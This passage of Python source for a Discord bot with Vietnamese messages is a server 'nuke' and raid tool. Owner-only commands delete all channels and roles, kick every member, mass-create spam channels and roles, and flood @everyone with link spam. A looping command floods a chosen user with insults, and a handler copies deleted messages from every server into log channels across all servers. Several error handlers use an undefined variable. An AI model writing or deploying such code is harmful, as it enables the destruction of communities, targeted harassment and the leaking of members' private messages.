        )
        dm_embed.set_image(url="https://i.pinimg.com/originals/16/d5/83/16d583a3fd6d356e5a1d5e57b318474c.gif")
        await member.send(embed=dm_embed)
    except:
        pass

    if guild_id in GOODBYE_CHANNELS:
        ch_id = GOODBYE_CHANNELS[guild_id]
        channel = member.guild.get_channel(ch_id)
        if channel:
            embed = discord.Embed(
                title="😢 **TẠM BIỆT THÀNH VIÊN** 😢",
                description=f"Thật sự rất nuối tiếc... Tạm biệt {member.mention}, chúc bạn luôn vui vẻ và có nhiều sức khỏe trên con đường mới!",
                color=0xFF0000
            )
            embed.set_image(url="https://i.pinimg.com/originals/16/d5/83/16d583a3fd6d356e5a1d5e57b318474c.gif")
            await channel.send(embed=embed)

# ==================== LỆNH NUKE ====================
@bot.command(name="nuke")
@is_bot_owner()
async def nuke_server(ctx):
    try:
        try:
            await ctx.message.delete()
        except:
            pass

        confirm_embed = discord.Embed(
            title="🔴 🌈 **XÁC NHẬN LỆNH NUKE TỪ BOSS BẢO** 🌈 🔴",
            description=(
                f"🔥 **Kính chào Boss Bảo!**\nBạn đã yêu cầu nuke máy chủ: **{ctx.guild.name}** (`{ctx.guild.id}`)\n\n"
                f"Vui lòng kiểm tra kỹ và bấm nút bên dưới để quyết định:\n"
                f"• 🟢 **Đồng ý:** Bot sẽ check server và tiến hành xả 2000 tin nhắn (20 tin/kênh).\n"
                f"• 🔴 **Từ chối:** Hủy bỏ lệnh và thông báo."
            ),
            color=0xFF0000
        )
        confirm_embed.set_footer(text="Hệ thống tối cao phục vụ Boss Bảo 💖")

        view = NukeConfirmView(ctx.guild, ctx.channel)
        await ctx.author.send(embed=confirm_embed, view=view)
        
        temp_notice = await ctx.send("📩 **Boss Bảo check tin nhắn riêng (DM) để xác nhận lệnh nuke nhé!**")
        await asyncio.sleep(5)
        try:
            await temp_notice.delete()
        except:
            pass

    except discord.Forbidden:
        await ctx.send("❌ Boss Bảo ơi, hãy mở DM (Tin nhắn riêng) để bot có thể gửi bảng xác nhận nuke nhé!")
    except Exception as e:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(e)}")

@nuke_server.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi khi thực hiện lệnh nuke: {str(error)}")

# ==================== CÁC LỆNH PHỤ TRỢ (SPAM, KICK, ROLE, CHANNEL, SETTING...) ====================
@bot.command(name="spamchannels")
@is_bot_owner()
async def spam_channels(ctx, amount: int = 100):
    try:
        if amount > 200:
            amount = 200
        embed = discord.Embed(
            title="🚀 🌈 **KÍCH HOẠT TẠO KÊNH SPAM CHO BOSS BẢO** 🌈",
            description=f"🔥 **Đang tạo {amount} kênh...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        for i in range(amount):
            try:
                channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
                await ctx.guild.create_text_channel(name=channel_name)
                await asyncio.sleep(0.5)
            except:
                continue
        complete_embed = discord.Embed(
            title="✅ 🌈 **TẠO KÊNH HOÀN TẤT** 🌈",
            description=f"🎉 **Đã tạo thành công {amount} kênh spam!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_channels.error
async def spam_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="spameveryone")
@is_bot_owner()
async def spam_everyone(ctx):
    try:
        spam_content = (
            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT(●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"|| link support 1 ||: https://xnhau.pics/"\n'
            ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
        )
        embed = discord.Embed(
            title="🚀 🌈 **KÍCH HOẠT SPAM @EVERYONE** 🌈",
            description="🔥 **Đang spam @everyone theo lệnh Boss Bảo...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        for channel in ctx.guild.text_channels:
            try:
                for _ in range(10):
                    embed = discord.Embed()
                    embed.set_image(url=NUKE_GIF_URL)
                    await channel.send(spam_content, embed=embed)
                    await asyncio.sleep(0.1)
            except:
                continue
        complete_embed = discord.Embed(
            title="✅ 🌈 **SPAM @EVERYONE HOÀN TẤT** 🌈",
            description="🎉 **Đã spam thông điệp hoàn tất!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_everyone.error
async def spam_everyone_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="deleteallchannels")
@is_bot_owner()
async def delete_all_channels(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ 🌈 **XÁC NHẬN XÓA TẤT CẢ KÊNH** 🌈 ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ xóa **TOÀN BỘ** kênh trong server\n\n"
                f"🔹 **Gõ l!confirmdelete để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmdelete":
                await ctx.send("❌ Lệnh xóa kênh đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ.")
            return
        embed = discord.Embed(
            title="🚀 🌈 **ĐANG XÓA TẤT CẢ KÊNH...** 🌈",
            description="🔥 **Đang thực hiện...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.5)
            except:
                continue
        complete_embed = discord.Embed(
            title="✅ 🌈 **XÓA KÊNH HOÀN TẤT** 🌈",
            description="🎉 **Đã xóa thành công tất cả kênh!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_all_channels.error
async def delete_all_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="spamroles")
@is_bot_owner()
async def spam_roles(ctx, amount: int = 50):
    try:
        if amount > 250:
            amount = 250
        embed = discord.Embed(
            title="🚀 🌈 **TẠO ROLE SPAM** 🌈",
            description=f"🔥 **Đang tạo {amount} role...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        for i in range(amount):
            try:
                role_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
                color = discord.Color(random.randint(0, 0xFFFFFF))
                await ctx.guild.create_role(name=role_name, color=color, hoist=True, mentionable=True)
                await asyncio.sleep(0.5)
            except:
                continue
        complete_embed = discord.Embed(
            title="✅ 🌈 **TẠO ROLE HOÀN TẤT** 🌈",
            description=f"🎉 **Đã xong {amount} role!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_roles.error
async def spam_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="deleteallroles")
@is_bot_owner()
async def delete_all_roles(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ 🌈 **XÁC NHẬN XÓA TẤT CẢ ROLE** 🌈 ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ xóa **TOÀN BỘ** role\n\n"
                f"🔹 **Gõ l!confirmdeleteroles để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmdeleteroles":
                await ctx.send("❌ Hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian.")
            return
        embed = discord.Embed(
            title="🚀 🌈 **ĐANG XÓA TẤT CẢ ROLE...** 🌈",
            description="🔥 **Đang xử lý...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        for role in ctx.guild.roles:
            try:
                if role.name != "@everyone":
                    await role.delete()
                    await asyncio.sleep(0.5)
            except:
                continue
        complete_embed = discord.Embed(
            title="✅ 🌈 **XÓA ROLE HOÀN TẤT** 🌈",
            description="🎉 **Đã xóa xong!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_all_roles.error
async def delete_all_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="kickall")
@is_bot_owner()
async def kick_all_members(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ 🌈 **XÁC NHẬN KICK TẤT CẢ THÀNH VIÊN** 🌈 ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ kick toàn bộ thành viên trừ Boss và bot.\n\n"
                f"🔹 **Gõ l!confirmkickall để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmkickall":
                await ctx.send("❌ Hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian.")
            return
        embed = discord.Embed(
            title="🚀 🌈 **ĐANG KICK THÀNH VIÊN...** 🌈",
            description="🔥 **Đang thực hiện...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        for member in ctx.guild.members:
            try:
                if (not member.bot and
                    member.id not in BOT_OWNERS and
                    member.id != ctx.guild.owner_id):
                    await member.kick(reason="Server nuke theo lệnh Boss Bảo")
                    await asyncio.sleep(1)
            except:
                continue
        complete_embed = discord.Embed(
            title="✅ 🌈 **KICK HOÀN TẤT** 🌈",
            description="🎉 **Đã thực thi xong!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@kick_all_members.error
async def kick_all_members_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="setservername")
@is_bot_owner()
async def set_server_name(ctx, *, new_name: str):
    try:
        if len(new_name) > 100:
            new_name = new_name[:100]
        await ctx.guild.edit(name=new_name)
        embed = discord.Embed(
            title="✅ 🌈 **THAY ĐỔI TÊN SERVER THÀNH CÔNG** 🌈",
            description=f"🎉 **Đã đổi thành:** {new_name}",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_server_name.error
async def set_server_name_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="setservericon")
@is_bot_owner()
async def set_server_icon(ctx, url: str = None):
    try:
        if url:
            if not url.startswith(('http://', 'https://')):
                raise ValueError("URL không hợp lệ")
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        raise ValueError("Không tải được ảnh")
                    image_data = await resp.read()
        else:
            image_data = None
        await ctx.guild.edit(icon=image_data)
        embed = discord.Embed(
            title="✅ 🌈 **THAY ĐỔI ICON SERVER THÀNH CÔNG** 🌈",
            description="🎉 **Icon đã cập nhật!**",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_server_icon.error
async def set_server_icon_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(e)}")

# ==================== LỆNH MUTE & UNMUTE ====================
@bot.command(name="mute")
@is_bot_owner()
async def mute(ctx, member: discord.Member, duration: str = None, *, reason="Không có lý do"):
    try:
        time_delta = None
        duration_text = "Vĩnh viễn"
        if duration:
            unit = duration[-1].lower()
            try:
                val = int(duration[:-1])
            except ValueError:
                await ctx.send("❌ Sai định dạng thời gian! Ví dụ: `10m` (phút), `2d` (ngày), `1w` (tuần), `1t` (tháng).")
                return

            if unit == 'm':
                time_delta = timedelta(minutes=val)
                duration_text = f"{val} phút"
            elif unit == 'd':
                time_delta = timedelta(days=val)
                duration_text = f"{val} ngày"
            elif unit == 'w':
                time_delta = timedelta(weeks=val)
                duration_text = f"{val} tuần"
            elif unit == 't':
                time_delta = timedelta(days=val * 30)
                duration_text = f"{val} tháng"
            else:
                await ctx.send("❌ Đơn vị thời gian không hợp lệ! Dùng: **m** (phút), **d** (ngày), **w** (tuần), **t** (tháng).")
                return

        muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
        if not muted_role:
            muted_role = await ctx.guild.create_role(name="Muted", permissions=discord.Permissions(send_messages=False, speak=False))
            for channel in ctx.guild.channels:
                try:
                    await channel.set_permissions(muted_role, send_messages=False, speak=False)
                except:
                    pass
        
        await member.add_roles(muted_role, reason=f"Lệnh từ Boss Bảo - {reason}")
        
        if time_delta:
            try:
                await member.timeout(time_delta, reason=reason)
            except:
                pass

        embed = discord.Embed(
            title="🔇 🌈 **ĐÃ MUTE THÀNH VIÊN** 🌈",
            description=f"👤 **Thành viên:** {member.mention}\n⏳ **Thời gian:** {duration_text}\n📌 **Lý do:** {reason}",
            color=0xFF9900
        )
        await ctx.send(embed=embed)

        try:
            dm_embed = discord.Embed(
                title="🔇 **BẠN ĐÃ BỊ MUTE TRONG SERVER** 🔇",
                description=(
                    f"🏰 **Máy chủ:** {ctx.guild.name}\n"
                    f"⏳ **Thời hạn mute:** {duration_text}\n"
                    f"📌 **Lý do:** {reason}\n\n"
                    f"⚠️ Vui lòng rút kinh nghiệm và tuân thủ nội quy server để tránh bị xử phạt nặng hơn nhé!"
                ),
                color=0xFF0000
            )
            dm_embed.set_footer(text="Hệ thống kiểm duyệt độc quyền của Boss Bảo")
            await member.send(embed=dm_embed)
        except:
            pass

    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="unmute")
@is_bot_owner()
async def unmute(ctx, member: discord.Member):
    try:
        muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
        unmuted_status = False

        if muted_role and muted_role in member.roles:
            await member.remove_roles(muted_role, reason="Lệnh từ Boss Bảo")
            unmuted_status = True

        try:
            await member.timeout(None, reason="Lệnh unmute từ Boss Bảo")
            unmuted_status = True
        except:
            pass

        if unmuted_status:
            embed = discord.Embed(
                title="🔊 🌈 **ĐÃ BỎ MUTE THÀNH VIÊN** 🌈",
                description=f"👤 {member.mention} đã được bỏ mute và khôi phục quyền trò chuyện.",
                color=0x00FF00
            )
            await ctx.send(embed=embed)

            try:
                dm_embed = discord.Embed(
                    title="🔊 **BẠN ĐÃ ĐƯỢC UNMUTE!** 🔊",
                    description=(
                        f"✨ Chúc mừng bạn! Lệnh cấm chat tại máy chủ **{ctx.guild.name}** đã được gỡ bỏ.\n"
                        f"🎉 Bạn có thể tiếp tục trò chuyện bình thường. Hãy giữ gìn nội quy server nhé!"
                    ),
                    color=0x00FF00
                )
                dm_embed.set_footer(text="Hệ thống kiểm duyệt độc quyền của Boss Bảo")
                await member.send(embed=dm_embed)
            except:
                pass
        else:
            await ctx.send("⚠️ Thành viên này hiện không bị mute.")

    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

# ==================== LỆNH WARN & CLEAR ====================
@bot.command(name="warn")
@is_bot_owner()
async def warn(ctx, member: discord.Member, *, reason="Cảnh cáo chung"):
    try:
        embed = discord.Embed(
            title="⚠️ 🌈 **CẢNH CÁO TỪ BOSS BẢO** 🌈",
            description=f"Bạn đã bị cảnh cáo trong server **{ctx.guild.name}**\n📌 Lý do: {reason}",
            color=0xFF0000
        )
        await member.send(embed=embed)
        await ctx.send(f"✅ Đã gửi cảnh cáo đến {member.mention}.")
    except:
        await ctx.send("❌ Không thể gửi tin nhắn riêng cho thành viên này.")

@bot.command(name="clear")
@is_bot_owner()
async def clear(ctx, amount: int = 10):
    if amount < 1 or amount > 1000:
        await ctx.send("⚠️ Số lượng từ 1 đến 1000.")
        return
    try:
        deleted = await ctx.channel.purge(limit=amount)
        embed = discord.Embed(
            title="🧹 🌈 **ĐÃ XÓA TIN NHẮN** 🌈",
            description=f"Đã xóa {len(deleted)} tin nhắn.",
            color=0x00CCFF
        )
        await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

# ==================== LỆNH THÊM/XÓA OWNER ====================
@bot.command(name="addowner")
@is_bot_owner()
async def addowner(ctx, target: discord.User):
    if target.id in BOT_OWNERS:
        await ctx.send(f"❌ **{target}** đã là Owner của Boss Bảo rồi!")
        return
    BOT_OWNERS.append(target.id)
    await ctx.send(f"✅ Đã thêm **{target}** vào danh sách đồng minh tối cao của Boss Bảo!")

@addowner.error
async def addowner_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deleteowner")
@is_bot_owner()
async def deleteowner(ctx, target: discord.User):
    if len(BOT_OWNERS) <= 1:
        await ctx.send("🔥 Không thể xóa Owner cuối cùng!")
        return
    if target.id not in BOT_OWNERS:
        await ctx.send(f"❌ Không tìm thấy Owner **{target}**!")
        return
    BOT_OWNERS.remove(target.id)
    await ctx.send(f"🗑️ Đã xóa **{target}** khỏi danh sách.")

@deleteowner.error
async def deleteowner_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH SPAM CHỬI ====================
@bot.command(name="spam")
@is_bot_owner()
async def spam(ctx, member: discord.Member = None, *, custom_text: str = None):
    global spam_task_running, is_spamming
    if member is None:
        await ctx.send("📌 Cú pháp: `l!spam @user [câu chửi tùy chỉnh]`")
        return
    if spam_task_running and not spam_task_running.done():
        spam_task_running.cancel()
    is_spamming = True
    await ctx.send(f"🚨 Đang tấn công {member.mention} theo lệnh Boss Bảo! Gõ `l!stop` để dừng.")

    async def spam_loop():
        try:
            while True:
                if custom_text:
                    msg = f"{member.mention} {custom_text}"
                else:
                    template = random.choice(ROAST_LINES)
                    msg = template.format(username=member.mention)
                await ctx.send(msg)
                await asyncio.sleep(0.6)
        except asyncio.CancelledError:
            pass
        except Exception:
            pass

    spam_task_running = bot.loop.create_task(spam_loop())

@spam.error
async def spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="stop")
@is_bot_owner()
async def stop_bot(ctx):
    global is_spamming, spam_task_running
    is_spamming = False
    if spam_task_running:
        spam_task_running.cancel()
        spam_task_running = None
    await ctx.send("🛑 Đã dừng mọi hoạt động spam theo lệnh Boss Bảo.")

@stop_bot.error
async def stop_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH CHANNELSLOG ====================
@bot.command(name="channelslog")
@is_bot_owner()
async def channelslog(ctx, channel: discord.TextChannel = None):
    if channel is None:
        if ctx.guild.id in SERVER_LOG_CHANNELS:
            del SERVER_LOG_CHANNELS[ctx.guild.id]
        await ctx.send("✅ Đã tắt log sự kiện.")
        return
    SERVER_LOG_CHANNELS[ctx.guild.id] = channel.id
    await ctx.send(f"✅ Đã thiết lập kênh log sự kiện là {channel.mention}")

@channelslog.error
async def channelslog_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== HỆ THỐNG LOG ĐỒNG BỘ TOÀN BỘ SERVER ====================
async def send_log_to_all(source_guild_id, embed):
    for g_id, ch_id in SERVER_LOG_CHANNELS.items():
        channel = bot.get_channel(ch_id)
        if channel:
            try:
                await channel.send(embed=embed)
            except:
                pass

@bot.event
async def on_message_delete(message):
    if message.guild is None or message.author.bot or not message.content:
        return
    embed = discord.Embed(
        title="🗑️ TIN NHẮN BỊ XÓA", 
        description=f"**Server:** `{message.guild.name}`\n**Người gửi:** {message.author.mention}\n**Kênh:** {message.channel.mention}", 
        color=0xFF0000
    )
    embed.add_field(name="Nội dung", value=message.content[:1000], inline=False)
    await send_log_to_all(message.guild.id, embed)

@bot.event
async def on_guild_channel_create(channel):
    if channel.guild is None: return
    embed = discord.Embed(
        title="🆕 KÊNH MỚI ĐƯỢC TẠO", 
        description=f"**Server:** `{channel.guild.name}`\n**Kênh:** {channel.mention}", 
        color=0x00FF00
    )
    await send_log_to_all(channel.guild.id, embed)

@bot.event
async def on_guild_channel_delete(channel):
    if channel.guild is None: return
    embed = discord.Embed(
        title="🗑️ KÊNH BỊ XÓA", 
        description=f"**Server:** `{channel.guild.name}`\n**Tên kênh:** `{channel.name}`", 
        color=0xFF0000
    )
    await send_log_to_all(channel.guild.id, embed)

# ==================== LỆNH SETUP ====================
@bot.command(name="setup")
@is_bot_owner()
async def setup(ctx):
    embed = discord.Embed(
        title="💖✨ HỆ THỐNG QUẢN TRỊ TỐI CAO CỦA BOSS BẢO ✨💖",
        description=(
            f"🌸 **Kênh kết nối:** {ctx.channel.mention}\n"
            "📋 **Danh sách lệnh điều hành phục vụ Boss Bảo:**\n\n"
            "🔹 **1. `l!setup`** - Hiển thị bảng điều khiển.\n"
            "🔹 **2. `l!nuke`** - Gửi yêu cầu nuke bảo mật qua DM của Boss Bảo.\n"
            "🔹 **3. `l!setlv`** - Đặt level và cộng role hệ thống cho người dùng.\n"
            "🔹 **4. `l!lv`** - Kiểm tra level của bản thân hoặc người dùng khác.\n"
            "🔹 **5. `l!channelslv`** - Đặt kênh quét tin nhắn báo level.\n"
            "🔹 **6. `l!addrole`** - Tạo role mới mang toàn bộ quyền của bot.\n"
            "🔹 **7. `l!showsv`** - Xem danh sách tất cả các server bot đang ở.\n"
            "🔹 **8. `l!spamchannels`** - Tạo kênh spam.\n"
            "🔹 **9. `l!spameveryone`** - Spam @everyone.\n"
            "🔹 **10. `l!deleteallchannels`** - Xóa tất cả kênh.\n"
            "🔹 **11. `l!spamroles`** - Tạo role spam.\n"
            "🔹 **12. `l!deleteallroles`** - Xóa tất cả role.\n"
            "🔹 **13. `l!kickall`** - Kick toàn bộ thành viên.\n"
            "🔹 **14. `l!setservername`** - Đổi tên server.\n"
            "🔹 **15. `l!setservericon`** - Đổi avatar server.\n"
            "🔹 **16. `l!spam`** - Spam chửi mục tiêu.\n"
            "🔹 **17. `l!stop`** - Dừng spam.\n"
            "🔹 **18. `l!addowner`** - Thêm Owner.\n"
            "🔹 **19. `l!deleteowner`** - Xóa Owner.\n"
            "🔹 **20. `l!mute`** - Cấm nói (hỗ trợ m, d, w, t).\n"
            "🔹 **21. `l!unmute`** - Bỏ cấm nói.\n"
            "🔹 **22. `l!warn`** - Cảnh cáo.\n"
            "🔹 **23. `l!clear`** - Xóa tin nhắn.\n"
            "🔹 **24. `l!stats`** - Xem thông số server.\n"
            "🔹 **25. `l!channelslog`** - Cài kênh log sự kiện toàn hệ thống.\n"
            "🔹 **26. `l!setwellcom`** - Cài kênh chào mừng.\n"
            "🔹 **27. `l!setgoodbye`** - Cài kênh tạm biệt.\n"
            "🔹 **28. `l!help`** - Trợ giúp."
        ),
        color=0xFF69B4
    )
    embed.set_image(url=CUSTOM_SETUP_GIF)
    embed.set_footer(text="Độc quyền phục vụ Boss Bảo 💖", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@setup.error
async def setup_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH STATS ====================
@bot.command(name="stats")
async def stats(ctx):
    guild = ctx.guild
    embed = discord.Embed(
        title=f"📊 🌈 **THÔNG SỐ MÁY CHỦ** 🌈",
        description=f"🏰 **Tên máy chủ:** `{guild.name}`\n👑 **Bảo trợ:** Boss Bảo",
        color=0xFF69B4
    )
    await ctx.send(embed=embed)

# ==================== LỆNH HELP ====================
@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="📖 🌈 **CẨM NANG ĐIỀU HÀNH & DANH SÁCH LỆNH** 🌈",
        description=(
            f"💖 **Hệ thống quản trị độc quyền phục vụ tối cao cho Boss Bảo.**\n\n"
            "📋 **Danh sách lệnh và tính năng của hệ thống:**\n\n"
            "🔹 **1. `l!setup`** - Hiển thị bảng điều khiển setup.\n"
            "🔹 **2. `l!nuke`** - Gửi yêu cầu nuke bảo mật qua DM của Boss Bảo.\n"
            "🔹 **3. `l!setlv`** - Thiết lập level trực tiếp cho user.\n"
            "🔹 **4. `l!lv`** - Kiểm tra level của bản thân hoặc người dùng khác.\n"
            "🔹 **5. `l!channelslv`** - Đặt kênh quét tin nhắn báo level.\n"
            "🔹 **6. `l!addrole`** - Tạo role mới mang toàn bộ quyền của bot.\n"
            "🔹 **7. `l!showsv`** - Xem danh sách tất cả các server bot đang ở.\n"
            "🔹 **8. `l!spamchannels`** - Tạo hàng loạt kênh spam.\n"
            "🔹 **9. `l!spameveryone`** - Spam thông điệp @everyone.\n"
            "🔹 **10. `l!deleteallchannels`** - Xóa tất cả các kênh trong server.\n"
            "🔹 **11. `l!spamroles`** - Tạo hàng loạt role spam.\n"
            "🔹 **12. `l!deleteallroles`** - Xóa toàn bộ role.\n"
            "🔹 **13. `l!kickall`** - Kick toàn bộ thành viên.\n"
            "🔹 **14. `l!setservername`** - Đổi tên server.\n"
            "🔹 **15. `l!setservericon`** - Đổi avatar/icon server.\n"
            "🔹 **16. `l!spam`** - Bật chế độ spam chửi mục tiêu.\n"
            "🔹 **17. `l!stop`** - Dừng mọi hoạt động spam.\n"
            "🔹 **18. `l!addowner`** - Thêm Owner phụ quyền.\n"
            "🔹 **19. `l!deleteowner`** - Xóa Owner phụ quyền.\n"
            "🔹 **20. `l!mute`** - Cấm nói thành viên (Hỗ trợ m, d, w, t).\n"
            "🔹 **21. `l!unmute`** - Bỏ cấm nói thành viên.\n"
            "🔹 **22. `l!warn`** - Gửi tin nhắn cảnh cáo thành viên.\n"
            "🔹 **23. `l!clear`** - Xóa số lượng tin nhắn nhanh.\n"
            "🔹 **24. `l!stats`** - Xem thông số hệ thống server.\n"
            "🔹 **25. `l!channelslog`** - Thiết lập kênh log sự kiện toàn hệ thống.\n"
            "🔹 **26. `l!setwellcom`** - Cài đặt kênh chào mừng thành viên.\n"
            "🔹 **27. `l!setgoodbye`** - Cài đặt kênh thông báo tạm biệt.\n"
            "🔹 **28. `l!help`** - Hiển thị bảng hướng dẫn này."
        ),
        color=0xFF69B4
    )
    embed.set_image(url=CUSTOM_SETUP_GIF)
    embed.set_footer(text="Tôn vinh Boss Bảo 💖", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

# ==================== XỬ LÝ MESSAGE, EXP, LEVEL & TAG OWNER ====================
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    guild_id = message.guild.id if message.guild else None
    if guild_id:
        if guild_id not in USER_LEVELS:
            USER_LEVELS[guild_id] = {}
        
        user_id = message.author.id
        if user_id not in USER_LEVELS[guild_id]:
            USER_LEVELS[guild_id][user_id] = {"exp": 0, "level": 1}

        user_data = USER_LEVELS[guild_id][user_id]
        if user_data["level"] < 670:
            user_data["exp"] += 10
            
            current_lv = user_data["level"]
            if current_lv % 10 == 0:
                required_exp_for_next = 500
            else:
                required_exp_for_next = 100

            if user_data["exp"] >= required_exp_for_next and user_data["level"] < 670:
